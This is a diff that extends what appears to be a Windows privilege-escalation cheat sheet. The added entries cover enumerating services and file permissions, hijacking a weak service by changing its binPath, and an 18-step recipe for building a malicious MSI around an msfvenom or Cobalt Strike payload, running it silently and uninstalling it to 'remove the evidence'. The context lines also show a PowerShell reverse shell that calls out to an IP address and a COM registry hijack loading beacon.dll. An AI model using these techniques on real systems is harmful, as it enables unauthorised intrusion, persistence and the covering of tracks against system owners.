@@ -101,6 +101,11 @@
 
 `tasklist /SVC`
 
+#### Show all services
+
+`sc query`
+`Get-Service | fl` (POWERSHELL)
+
 #### Show running services
 
 `sc queryex type= service`
@@ -108,6 +113,10 @@
 #### Show services that start at boot.
 
 `net start`
+
+### Check permissions of file or directory (POWERSHELL)
+
+`Get-Acl -Path "C:\Program Files\Vuln File" | fl`
 
 #### Check Service Registry for weak permissions.
 
@@ -161,6 +170,10 @@ foreach ($Task in $Tasks)
   }
 }
 ```
+
+#### Show binary permissions
+
+`Get-Acl -Path "C:\Program Files\Vuln Services\Service 3.exe" | fl`
 
 <!--
 ##################################################################
@@ -260,6 +273,31 @@ $client = New-Object System.Net.Sockets.TCPClient("192.168.49.203",443);$stream 
 #### Point Registry Item Towards EXE/DLL or Add/Edit a Field Value (POWERSHELL)
 
 `New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"`
+
+#### Change binary path of service with weak permissions
+
+`sc config Vuln-Service binPath= C:\Temp\fake-service.exe`
+
+#### Build Malicious MSI
+
+1. Generate payload with method of your choosing (msfvenom, Cobalt Strike, etc).
+2. Open Visual Studio.
+3. Create new project and search for installer.
+4. Select Setup Wizard and click Next.
+5. Name it and use payloads directory for location.
+6. Select place solution and project in the same directory and click Create.
+7. Click next until step 3 of 4 (choose files to include).
+8. Click Add and select your payload.
+9. Click Finish.
+10. Highlight your project and change TargetPlatform from x86 to x64 using Properties. (You can also change Author and Manufacturer for added legitimacy).
+11. Right-click the project and select View -> Custom Actions.
+12. Right-click Install and select Add Custom Action.
+13. Double-click Application Folder and select your payload.
+14. Click OK.
+15. Finally Build the project.
+16. Upload to target.
+17. Execute using `msiexec /i EvilInstaller.msi /q /n`
+18. Remove the evidence `msiexec /q /n /uninstall BeaconInstaller.msi`
 
 <!--
 ##################################################################
@@ -398,3 +436,7 @@ Start
 #### Change local users password
 
 `net user loginid newpassword`
+
+#### Get information on error codes
+
+`net helpmsg ERRORCODE`
